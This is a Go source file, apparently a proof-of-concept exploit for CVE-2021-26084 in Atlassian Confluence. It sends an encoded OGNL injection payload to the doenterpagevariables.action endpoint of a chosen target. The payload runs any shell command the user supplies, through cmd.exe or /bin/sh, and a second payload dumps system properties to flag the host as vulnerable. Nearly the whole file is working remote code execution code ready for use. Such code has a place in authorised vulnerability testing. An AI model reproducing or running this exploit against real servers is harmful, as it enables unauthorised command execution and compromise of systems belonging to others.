package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
)

type TestResult struct {
	Target           string
	QueryType        int    // 1 = command, 2 = property
	ResponseCode     int    // http response code
	FullResponseBody string // full body of response
	Vulnerable       string // "VULNERABLE", "POTENTIAL", "NO", "FAILED", 'potential' means check output yourself to confirm manually
	Error            string // error details
}

func main() {
	fmt.Println("CVE-2021-26084 PoC\nBased on: https://twitter.com/jas502n/status/1433044110277890057?s=20")

	var TargetAddr string
	var CommandStr string
	var OutFile string

	flag.StringVar(&TargetAddr, "t", "https://google.com", "the target confluence domain")
	flag.StringVar(&CommandStr, "c", "ifconfig", "the command to execute")
	flag.StringVar(&OutFile, "o", "cve202126084_results.json", "output location for json results")
	flag.Parse()

	QueryString1 := "\\u0027%2b{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var+isWin+%3d+java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022window\\u0022)%3bvar+cmd+%3d\\u0022" + url.QueryEscape(CommandStr) + "\\u0022%3bvar+cmds+%3d+new+Array()%3bif+(isWin)+{cmds+%3d+(\\u0022cmd.exe\\u0022,+\\u0022/c\\u0022,+cmd)%3b}+else+{cmds+%3d+(\\u0022/bin/sh\\u0022,+\\u0022-c\\u0022,+cmd)%3b}new+java.util.Scanner(new+java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(\\u0022\\\\r\\u0022).next()%3b\\u0027)}%2b\\u0027"
	QueryString2 := "\\u0027%2b{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027java.lang.System.GetProperties().toString()\\u0027)}%2b\\u0027"

	FullURL := fmt.Sprintf("%s/pages/doenterpagevariables.action", TargetAddr)

	ch := make(chan *TestResult)

	// querystring1
	go func() {
		querytype := 1
		data := url.Values{
			"queryString": {QueryString1},
		}

		resp, err := http.PostForm(FullURL, data)
		if err != nil {
			ch <- &TestResult{
				Target:           FullURL,
				QueryType:        querytype,
				ResponseCode:     -1,
				FullResponseBody: "",
				Vulnerable:       "FAILED",
				Error:            err.Error(),
			}
			return
		}

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			ch <- &TestResult{
				Target:           FullURL,
				QueryType:        querytype,
				ResponseCode:     resp.StatusCode,
				FullResponseBody: "",
				Vulnerable:       "FAILED",
				Error:            err.Error(),
			}
			return
		}

		ch <- &TestResult{
			Target:           FullURL,
			QueryType:        querytype,
			ResponseCode:     resp.StatusCode,
			FullResponseBody: string(body),
			Vulnerable:       "POTENTIAL",
			Error:            "",
		}
	}()

	// querystring2
	go func() {
		querytype := 2
		data := url.Values{
			"queryString": {QueryString2},
		}

		resp, err := http.PostForm(FullURL, data)
		if err != nil {
			ch <- &TestResult{
				Target:           FullURL,
				QueryType:        querytype,
				ResponseCode:     -1,
				FullResponseBody: "",
				Vulnerable:       "FAILED",
				Error:            err.Error(),
			}
			return
		}

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			ch <- &TestResult{
				Target:           FullURL,
				QueryType:        querytype,
				ResponseCode:     resp.StatusCode,
				FullResponseBody: "",
				Vulnerable:       "FAILED",
				Error:            err.Error(),
			}
			return
		}

		if strings.Contains(string(body), "atlassian.enable.spring.strong.cache.bean.metadata") {
			ch <- &TestResult{
				Target:           FullURL,
				QueryType:        querytype,
				ResponseCode:     resp.StatusCode,
				FullResponseBody: string(body),
				Vulnerable:       "VULNERABLE",
				Error:            "",
			}
		} else if strings.Contains(string(body), "java.vendor") || strings.Contains(string(body), "atlassian.plugins.") {
			ch <- &TestResult{
				Target:           FullURL,
				QueryType:        querytype,
				ResponseCode:     resp.StatusCode,
				FullResponseBody: string(body),
				Vulnerable:       "POTENTIAL",
				Error:            "",
			}
		} else {
			ch <- &TestResult{
				Target:           FullURL,
				QueryType:        querytype,
				ResponseCode:     resp.StatusCode,
				FullResponseBody: string(body),
				Vulnerable:       "NO",
				Error:            "",
			}
		}

	}()

	received := 0
	results := []*TestResult{}
	for received < 2 {
		if result, ok := <-ch; ok {
			results = append(results, result)
			received++
		}
	}

	jsono, err := json.MarshalIndent(results, "", "\t")
	if err != nil {
		fmt.Println("failed to marshal results")
		fmt.Println(results)
	}

	fmt.Println(string(jsono))

	f, err := os.OpenFile(OutFile, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
	if err != nil {
		log.Fatal(err)
	}

	f.Write(jsono)
	f.Sync()

	if err := f.Close(); err != nil {
		log.Fatal(err)
	}

}
